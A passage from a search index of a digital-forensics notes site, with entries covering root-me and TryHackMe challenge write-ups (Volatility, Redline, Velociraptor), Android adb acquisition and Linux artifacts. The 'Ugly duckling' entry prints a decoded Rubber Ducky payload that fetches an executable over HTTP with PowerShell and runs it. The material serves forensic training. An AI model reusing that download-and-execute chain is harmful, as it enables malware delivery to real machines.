/Library/Preferences/com.apple.alf globalstate Gatekeeper: spctl --status Network Fileshare: nfsd status Remote Login: sudo systemsetup -getremotelogin Screen sharing: sudo launchctl list com.apple.screensharing SIP: csrutil status Resources   DFIR/Tools & Artifacts > macOS DFIR Artifacts > Mac Artifact List",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "e18ed3b939f45dd2a4c62b0c9d5c1b58",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/c&c2",
    "t": "Command & Control level 2 ",
    "c": "Command & Control level 2  root-me challenge : Congratulations Berthier, thanks to your help the computer has been identified. You have requested a memory dump but before starting your analysis you wanted to take a look at the antivirus’ logs. Unfortunately, you forgot to write down the workstation’s hostname. But since you have its memory dump you should be able to get it back! The validation flag is the workstation’s hostname. The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de Get file: ┌──(kali㉿kali)-[~/Downloads/root-me] └─$ wget http://challenge01.root-me.org/forensic/ch2/ch2.tbz2 Unpack: ┌──(kali㉿kali)-[~/Downloads/root-me/forensic] └─$ tar -jxvf ch2.tbz2 ch2.dmp Using volatility3, get info: ┌──(kali㉿kali)-[~/Downloads/volatility3] └─$ ./vol.py -f ../root-me/forensic/ch2.dmp windows.info ... Variable Value Kernel Base 0x82801000 DTB 0x185000 Symbols file:///home/kali/Downloads/volatility3/volatility3/symbols/windows/ntkrpamp.pdb/5B308B4ED6464159B87117C711E7340C-2.json.z Is64Bit False IsPAE True layer_name 0 WindowsIntelPAE memory_layer 1 FileLayer KdDebuggerDataBlock 0x82929be8 NTBuildLab 7600.16385.x86fre.win7_rtm.09071 CSDVersion 0 KdVersionBlock 0x82929bc0 Major/Minor 15.7600 MachineType 332 KeNumberProcessors 1 SystemTime 2013-01-12 16:59:18 NtSystemRoot C:\\Windows NtProductType NtProductWinNt NtMajorVersion 6 NtMinorVersion 1 PE MajorOperatingSystemVersion 6 PE MinorOperatingSystemVersion 1 PE Machine 332 PE TimeDateStamp Mon Jul 13 23:15:19 2009 Dump the hives: ┌──(kali㉿kali)-[~/Downloads/volatility3] └─$ ./vol.py -f ../root-me/forensic/ch2.dmp hivelist Volatility 3 Framework 2.4.2 Progress: 100.00 PDB scanning finished Offset FileFullPath File output 0x8b20c008 Disabled 0x8b21c008 \\REGISTRY\\MACHINE\\SYSTEM Disabled 0x8b23c008 \\REGISTRY\\MACHINE\\HARDWARE Disabled 0x8ee66008 \\Device\\HarddiskVolume1\\Boot\\BCD Disabled 0x8ee66740 \\SystemRoot\\System32\\Config\\SOFTWARE Disabled 0x90cab9d0 \\SystemRoot\\System32\\Config\\DEFAULT Disabled 0x9670e9d0 \\??\\C:\\Users\\John Doe\\ntuser.dat Disabled 0x9670f9d0 \\??\\C:\\Users\\John Doe\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat Disabled 0x9aad6148 \\SystemRoot\\System32\\Config\\SAM Disabled 0x9ab25008 \\SystemRoot\\System32\\Config\\SECURITY Disabled 0x9aba79d0 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT Disabled 0x9abb1720 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT Disabled Dump the registry key for getting the ComputerName : ┌──(kali㉿kali)-[~/Downloads/volatility3] └─$ ./vol.py -f ../root-me/forensic/ch2.dmp windows.registry.printkey --key \"ControlSet001\\Control\\ComputerName\\ComputerName\" Volatility 3 Framework 2.4.2 Progress: 100.00 PDB scanning finished Last Write Time Hive Offset Type Key Name Data Volatile - 0x8b20c008 Key ?\\ControlSet001\\Control\\ComputerName\\ComputerName - - 2013-01-12 00:58:30.000000 0x8b21c008 REG_SZ \\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\ComputerName\\ComputerName(Default) \"mnmsrvc\" False 2013-01-12 00:58:30.000000 0x8b21c008 REG_SZ \\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\ComputerName\\ComputerNameComputerName \"WIN-ETSA91RK***\" False ...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "601594b27adb4d02cb672161cf7f6b78",
    "u": "https://dfir.tymyrddin.dev/docs/notes/android-acquisition",
    "t": "Android acquisition ",
    "c": "Android acquisition  Extraction methods  Manual data extraction : This method is navigating the device as a normal user, using touch controls, screen controllers, and keyboards to access the information stored on the device and to record input directly from the screen. There are no special tools necessary, and the technical difficulty is modest. Disadvantages of this method are that large amounts of data will be exhausted over time, there is a risk of data adjustments being made by mistake, and it does not restore data that has been erased. It will certainly be impractical if the hardware is destroyed. It can be useful for validating outcomes. Logical data extraction : A standard interface between the workstation and the device is built using USB, Wi-Fi, or Bluetooth to send device data to the workstation. Technical complexity is minimal, but unintentional data changes may occur, and data access abstraction is high. Physical data extraction or hex dumping : With the device in diagnostic mode, its flash memory is downloaded. This can be done with conventional interfaces, and works with devices that have little damage. Data analysis and decoding might be difficult (JTAG requires training). Access to all partitions is not guaranteed. Chip-off : A binary image is extracted from the device’s removed physical flash memory. This allows for traditional analysis, but can cause physical harm to the device. And examiners need training. Micro read : An electron microscope is used to examine logic gates on a physical level and the observations turned into readable, comprehensible data. This method is extremely resource-intensive and technically challenging. Android partitions  Partition layout varies between device manufacturers and versions. Some of the common partitions found in most of the Android devices: Bootloader – This partition stores the phone’s bootloader program. This program takes care of initialising the low-level hardware when the phone boots. Boot – As the name suggests, this partition has the information and files required for the phone to boot. It contains the kernel and RAM disk. Recovery – Recovery partition allows the device to boot into the recovery console through which activities such as phone updates and other maintenance operations are done. A minimal Android boot image is stored as a failsafe. Userdata – This partition contains the device’s internal storage for application data, the bulk of user data, and standard communications. System – All the major components other than kernel and RAM disk: the Android framework, libraries, system binaries, and preinstalled applications. Cache – This partition is used to store frequently accessed data and various other files, such as recovery logs and update packages downloaded over the network. Radio – Devices with phone capabilities have a baseband image stored in this partition. Android logical data extraction  Connect the device to a workstation. Enable USB debugging . Enable the Stay awake setting. Increase screen timeout . The device needs to be isolated from the network to make sure that remote wipe options do not work on the device. Connecting device to a workstation  Identify the device cable: The physical USB interface of an Android device might change from manufacturer to manufacturer and from device to device: Mini - A USB, Micro - B USB, Co-axial (Nokia), D Sub-miniature (Samsung and LG devices) Install the device drivers if the device is not recognised. Because Android is allowed to be modified and customized by the manufacturers, there is no single generic driver that works for all Android devices. Each manufacturer writes its own proprietary drivers and distributes them over the internet. Some Android forensic toolkits come with some generic drivers or a set of the most widely used drivers. Access: connect the unlocked Android device to the computer directly using the USB cable. The Android device will appear as a new drive, and you will be able to access the files on the external storage. Some older Android devices may not be accessible unless the Turn on USB storage option is enabled. In some Android phones (especially with HTC), the device may expose more than one functionality when connected with a USB cable. Mount it as a disk drive to access the SD card. In order to give the best chance of accessing the evidence at a later date, if the device is unlocked, then turn on USB debugging if possible. USB debugging  The primary function of this option is to enable communication between the Android device and a workstation on which the Android SDK is installed. On a Samsung phone, access this under Settings -> Developer Options . Other Android phones may have different environments and configuration features. You may have to force the Developer Options option by accessing build mode. In Android version 4.2 and above, the developer options screen is hidden. In order to turn on USB debugging go into the settings menu, and go to the  phone or  tablet , and a field showing the Android build number appears. For Samsung, tap  phone , then Software information to find build number . If the android build number is tapped seven times, developer mode is enabled and the “Developer options” menu will appear above the “ phone” menu. From there, USB debugging can be turned on. You may also be able to adjust the Display Screen Timeout feature to extend the length of time before Auto-Lock is enabled. Starting from Android 4.2.2, Google has introduced the Secure USB debugging option. It only allows hosts that are explicitly authorised by the user to connect to the device using ADB. When the USB debugging option is selected, the device will run the adb daemon ( adbd ) in the background and will continuously look for a USB connection. The daemon will usually run under a non-privileged shell user account and thus will not provide access to the complete data. However, on rooted phones, adbd will run under the root account and thus provide access to all the data. It is not recommended to root a device to gain full access unless all other forensic methods fail. Should you choose to root an Android device, the methods must be well-documented and tested prior to attempting it on real evidence. Use ADB  The Android Debug Bridge (ADB) is a programming tool for debugging Android-based devices. The daemon on the Android device communicates with the server on the host PC through USB or TCP, which communicates with the end-client users via TCP. To get a list of all the devices connected to the forensic workstation: adb devices To kill the local adb service: adb kill-server To access the shell on an Android device and interact with the device: nina@tardis:~$ adb shell a50:/ $ Many linux commands can be used. Use adb shell to determine if a device is rooted. The shell will appear one of two ways, either with $ or # . To extract data using adb pull (transfer files from the device to the local workstation): adb pull [-a] path/of/file/on/phone path/of/file/on/computer The adb backup functionalityallows for backing up application data to a local computer over adb. This does not require root. When a developer makes an app, it is set to allow backups by default. It seems the vast majority of developers leave the default setting. Most Google applications disable backups; full application data from apps such as Gmail and Google Maps will therefor not be included. adb backup [-f <file>] [-apk|-noapk] [-obb|-noobb] [-shared|-noshared] [-all] [-system|-nosystem] [<packages…>] When making a backup, the user must approve it on the device => backups cannot be made without bypassing screen locks. The resulting backup data is stored as an .ab file but is actually a .tar file compressed with the Deflate algorithm. If a password was entered on the device when the backup was created, the file will also be AES encrypted. To add in a tar header, try opening the .ab file with a hex editor and replace the first 24 Bytes ( 0x18 )...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d2f7b96c81583a071e913091e1a76fa4",
    "u": "https://dfir.tymyrddin.dev/docs/thm/ioc-analysis",
    "t": "IOC Search Collector Analysis (Redline) ",
    "c": "IOC Search Collector Analysis (Redline)  Scenario: You are assigned to do a threat hunting task at Osinski Inc. They believe there has been an intrusion, and the malicious actor was using the tool to perform the lateral movement attack, possibly a “pass-the-hash” attack. Task: Can you find the file planted on the victim’s computer using IOC Editor and Redline IOC Search Collector? So far, you only know the following artifacts for the file: File Strings: 20210513173819Z0w0= <?<L<T<g= File Size (Bytes): 834936 Note: Open Previous Analysis, and use the existing Redline Session found in C:\\Users\\Administrator\\Documents\\Analysis\\Sessions\\AnalysisSession1 Questions  Provide the path of the file that matched all the artifacts along with the filename. Answer: C:\\Users\\Administrator\\AppData\\Local\\Temp\\8eJv8w2id6lqN85dfC.exe Provide the path where the file is located without including the filename. Answer: C:\\Users\\Administrator\\AppData\\Local\\Temp Who is the owner of the file? Answer: BUILTIN\\Administrators Provide the subsystem for the file. Answer: WINDOWS_CUI Provide the Device Path where the file is located. Answer: \\Device\\HarddiskVolume2 Provide the hash (SHA-256) for the file. Use the Get-FileHash command. Answer: 57492d33b7c0755bb411b22d2dfdfdf088cbbfcd010e30dd8d425d5fe66adff4 The attacker managed to masquerade the real filename. Can you find it having the hash in your arsenal? Answer: psexec.exe Resources  Redline User Guide IOC Editor User Guide",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "11ead8b5dfca26694edd07db721ad82a",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/rubber-duck",
    "t": "Ugly duckling ",
    "c": "Ugly duckling  root-me challenge : The CEO’s computer seems to have been compromised internally. A young trainee dissatisfied with not having been paid during his internship arouse our supsicion. A strange USB stick containing a binary file was found on the trainee’s desk. The CEO relies on you to analyze this file. Rubber duck. Decode file.bin using the decoder of ducktoolkit : DELAY iexplore http://challenge01.root-me.org/forensic/ch14/files/796f75277665206265656e2054524f4c4c4544.jpgENTER DELAY ... DELAY %USERPROFILE%\\Documents\\796f75277665206265656e2054524f4c4c4544.jpgDELAY ENTER ... DELAY powershell Start-Process powershell -Verb runAsDELAY PowerShell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGMAaABhAGwAbABlAG4AZwBlADAAMQAuAHIAbwBvAHQALQBtAGUALgBvAHIAZwAvAGYAbwByAGUAbgBzAGkAYwAvAGMAaAAxADQALwBmAGkAbABlAHMALwA2ADYANgBjADYAMQA2ADcANgA3ADYANQA2ADQAMwBmAC4AZQB4AGUAJwAsACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AApowershell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAcwBoAGUAbABsAC4AYQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBzAGgAZQBsAGwAZQB4AGUAYwB1AHQAZQAoACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AAoAexit b64 decode: iex (New-Object System.Net.WebClient).DownloadFile('http://challenge01.root-me.org/forensic/ch14/files/666c61676765643f.exe','666c61676765643f.exe'); iex (New-Object -com shell.application).shellexecute('666c61676765643f.exe'); Download that 666c61676765643f.exe and use strings to grep the flag.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "0c8092e7487fab2186381d70d3241d98",
    "u": "https://dfir.tymyrddin.dev/docs/thm/nightmare",
    "t": "Hunt for a nightmare (Volatility) ",
    "c": "THM Room: Velociraptor Hunt for a nightmare (Volatility)  Objective: Use Velociraptor to create an artifact to detect the PrintNightmare vulnerability! Luckily there is an artifact entry in the Artifact Exchange. To avoid just copy/pasting the artifact, you will need to construct a very simple VQL query. Below are steps to construct your VQL query to find the DLL: The Select clause, the column accessors should be fullpath (concatenate C:/ to the fullpath column accessor) and filename. Make sure the column headers for each column accessor are renamed. Fullpath should be Full_Path , and for filename it should be File_Name . Use parse_pe() to ensure only PE files are returned. (Check the VQL Reference ) Make sure the column header for this plugin should be renamed to PE. The From clause should use parse_mft() . The Where clause should not return any directories, only return binaries (PE files) and search the directory where this malicious DLL will most likely be found. Skeleton Query: SELECT \"C:/\" + FullPath AS *********,FileName AS *********,parse_pe(file=\"C:/\" + FullPath) AS ** FROM parse_mft(filename=\"C:/$***\", accessor=\"****\") WHERE *** IsDir AND FullPath =~ \"Windows/System32/spool/drivers\" AND ** Note: You will need to start Velociraptor in “Instant Velociraptor” mode. The instructions to do so can be found here . The virtual machine attached to this task is running Velociraptor version 0.6.2. Query: SELECT \"C:/\" + FullPath AS Full_Path,FileName AS File_Name,parse_pe(file=\"C:/\" + FullPath) AS PE FROM parse_mft(filename=\"C:/$MFT\", accessor=\"ntfs\") WHERE NOT IsDir AND FullPath =~ \"Windows/System32/spool/drivers\" AND PE Questions  What is the name in the Artifact Exchange to detect Printnightmare? Windows.Detection.PrintNightmare What is your Select clause? (no spaces after commas) SELECT \"C:/\" + FullPath AS Full_Path,FileName AS File_Name,parse_pe(file=\"C:/\" + FullPath) AS PE What is the name of the DLL that was placed by the attacker? and What is the PDB entry? nightmare.dll resp C:\\Users\\caleb\\source\\repos\\nightmare\\x64\\Release\\nightmare.pdb",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "7c2a753a0cf1d85e1d136167686b2111",
    "u": "https://dfir.tymyrddin.dev/docs/notes/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Notes on DFIR techniques. Why?  DFIR processes are often undocumented and practitioners gain their skillset through informal sharing of unwritten knowledge. Collecting, storing, and sharing information for reference and progress. How?  General  Forensic choreographies Preparing for acquisition Network forensics Image acquisition Android acquisition iOS acquisition Accessing images Windows analysis Linux analysis macOS analysis Mobile analysis iOS analysis Android analysis Resources",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "188d664a6171199de86772c3247f9820",
    "u": "https://dfir.tymyrddin.dev/docs/thm/standard",
    "t": "Standard Collector Analysis (Redline) ",
    "c": "Standard Collector Analysis (Redline)  Investigate an employee who is being accused of leaking private company data. Taking AGES, this! Questions  Provide the Operating System detected for the workstation. Answer: Windows Server 2019 Standard 17763 Provide the BIOS Version for the workstation. Answer: Xen 4.2.amazon What is the suspicious scheduled task that got created on the victim’s computer? Answer: MSOfficeUpdateFa.ke Find the message that the intruder left for you in the task. Answer: THM-p3R5IStENCe-m3Chani$m There is a new System Event ID created by an intruder with the source name “THM-Redline-User” and the Type “ERROR”. Find the Event ID #. Go to the Event Logs tab and filter for THM-Redline-User in the Source category: Answer: 546 Provide the message for the Event ID. Answer: Someone cracked my password. Now I need to rename my puppy-++- It looks like the intruder downloaded a file containing the flag for Question 8. Provide the full URL of the website. Go to the File Download History tab and look for strange looking downloads: Answer: https://wormhole.app/download-stream/gI9vQtChjyYAmZ8Ody0AuA Provide the full path to where the file was downloaded to including the filename. Answer: C:\\Program Files (x86)\\Windows Mail\\SomeMailFolder\\flag.txt Provide the message the intruder left for you in the file. Go there and open it in Notepad : Answer: THM{600D-C@7cH-My-FR1EnD} Resources  Redline User Guide",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d62628427ca990c3384e67ea4dfe965f",
    "u": "https://dfir.tymyrddin.dev/docs/notes/linux",
    "t": "Linux analysis ",
    "c": "Linux analysis  Filesystem hierarchy  The POSIX and Open Group UNIX standards didn’t define a detailed directory layout for Unix vendors to follow. Unix systems and Linux distributions document their directory hierarchy in the hier(7) or hier(5) man pages. The Linux community developed the Filesystem Hierarchy Standard (FHS) to encourage a common layout across distributions. The /boot/ and /boot/efi/ directories contain files for booting the system. Boot configuration (kernel parameters and so on) can be found here. Current and previous kernels can be found here together with the initial ramfs, which can be examined. On EFI systems, the EFI partition (a FAT filesystem) is often mounted inside the /boot/ directory. Any non-standard and non-default files that have been added to the /boot/ and /boot/efi/ directories should be examined. The /etc/ directory is the traditional location for system-wide configuration files and other data. The majority of these files are easily examined plain-text files. Configuration files may have a corresponding directory with a .d extension for drop-in files that are included as part of the configuration. The creation and modification timestamps indicate when a particular configuration file was added or changed. In addition, user-specific configuration files in a user’s /home/ directory may override system-wide /etc/ files. Deviations from the distro or software defaults are often found here and may be of forensic interest. Copies of the distro default files are sometimes found in /usr/share/factory/etc/* and can be compared with those in the /etc/ directory. When some distros perform upgrades to config files in /etc/ , they may create a backup copy of the old files or add the new file with an extension. The /srv/ directory is available for use by server application content, such as FTP or HTTP files (unused on many distributions and may be empty). This is a good directory to examine in case it contains files that were published or otherwise accessible over a network. The /tmp/ directory is for storing temporary files. These files may be deleted periodically or during boot, depending on the distro or system’s configuration. In some Linux distros, the contents of /tmp/ resides in RAM using the tmpfs virtual memory filesystem. On a forensic image, systems using tmpfs to mount /tmp/ will likely be empty. The /run/ directory is a tmpfs -mounted directory residing in RAM and will likely be empty on a forensic image. On a running system, this directory contains runtime information like PID and lock files, systemd runtime configuration, etc. There may be references to files and directories in /run/ found in logs or configuration files. The /home/ directory is the default location for user home directories. A user’s home directory contains files the user created or downloaded, including configuration, cache, data, documents, media, desktop contents, and other files the user owns. The /etc/skel/ directory (which might only contain hidden “.” files) contains the default contents of a newly created /home/* directory. The root user’s home directory is typically /root/ of the root filesystem. This is intentional so that root can log in even when /home/ is not mounted. These home directories are of significant interest because they provide information about a system’s human users. If /home/ is empty on a forensic image, it’s likely the user’s home directories are mounted from another filesystem or over a network. The creation (birth) timestamp of a user’s home directory may indicate when the user account was first added. Shells  The term Linux technically refers only to the kernel, which is the actual OS. Graphical interface, tools and utilities, and even the command line shell are not Linux but parts of a Linux distribution. A distribution is a functional package that typically contains the Linux kernel, installers and package managers (usually unique to the distribution), and programs and utilities (including standard applications, such as Office suites, web browsers, email/chat clients, …). The shell is a command prompt that humans and/or machines use to submit commands to instruct and control an OS. The shell starts or stops programs, installs software, shuts down a system, and performs other work. The command shell offers more powerful features and possibilities than graphical environments. The most common shell in use today, and the default in most Linux distributions, is Bash. Shell history  The Unix/Linux shell was not originally designed with logging or audit trails in mind. In the past, patches have been created to augment the history mechanism and hacks have attempted to capture commands as the shell is used. Using basic Bash shell history as an audit trail is rudimentary. The Bash shell history can be configured to satisfy the following basic requirements: Record the command entered by the examiner Record a timestamp for each command entered Record all commands, including duplicates, comments, and space-prefixed commands Avoid truncating or overwriting history files Avoid conflicts when using multiple terminal windows on the same system Include root and non-root command history Important information, such as the command completion time, the working directory where the command was executed, and the return code, are not logged. The Bash history is also not a tamper-resistant system: the examiner can easily modify or delete the history. Some shells, such as zsh , have additional history features that allow for the logging of elapsed time. Other proposed solutions to improve shell logging include the use of PS1 , PROMPT_COMMAND , trap and DEBUG , and key bindings to modify a command before executing. Using sudo logging ; auditd logging ; or special scripts, such as Bash-Preexec , can also improve command line logging. For basic shell command logging, the built-in shell history functionality can be configured to record command line activity. Add these commands to ~/.bashrc or /etc/profile : set -o history shopt -s histappend export HISTCONTROL = export HISTIGNORE = export HISTFILE = ~/.bash_history export HISTFILESIZE = -1 export HISTSIZE = -1 export HISTTIMEFORMAT = \"%F-%R \" These mean that history is enabled and in append mode (as opposed to overwriting with each new login). The two variables HISTCONTROL and HISTIGNORE control which commands are saved to the history file. A common default setting is to ignore duplicates and commands beginning with a space. To ensure complete logging of all commands, the HISTCONTROL and HISTIGNORE variables are explicitly set to null. The HISTFILE variable is explicitly set to ensure command history held in memory is saved when a shell exits. HISTFILESIZE and HISTSIZE are set to -1 to ensure history is not truncated or overwritten. The HISTTIMEFORMAT variable enables timestamps to be written to the history file and allows for setting a time format. Enumerating  To monitor received events: udevadm monitor Listing the associated files and paths for attached devices: udevadm info /dev/sdx Special devices  Several other devices are useful to know: The bit bucket, /dev/null , discards any data written to it. A steady stream of zeros is provided when accessing /dev/zero . The random number generator, /dev/random , provides a stream of random data when accessed. Tape drives typically start with /dev/st . Access other external media via /dev/cdrom or /dev/dvd (these are often symbolic links to /dev/sr* ). In some cases, devices are accessed through the generic SCSI device driver interface /dev/sg* . Other special pseudo devices include /dev/loop* and /dev/mapper/* devices. Files  Enumerating  Recursively look for particular file types, and once you find the files get their hashes: find . type f -exec sha256sum {} \\; 2 > /dev/null | grep -Ei '.asp|.js' | sort Recursively list out folders and filders in their tree-branch relationship: tree Tree and show the users who own the files and...",
    "cat": "blue_soc",
    "type": "html"
  }
]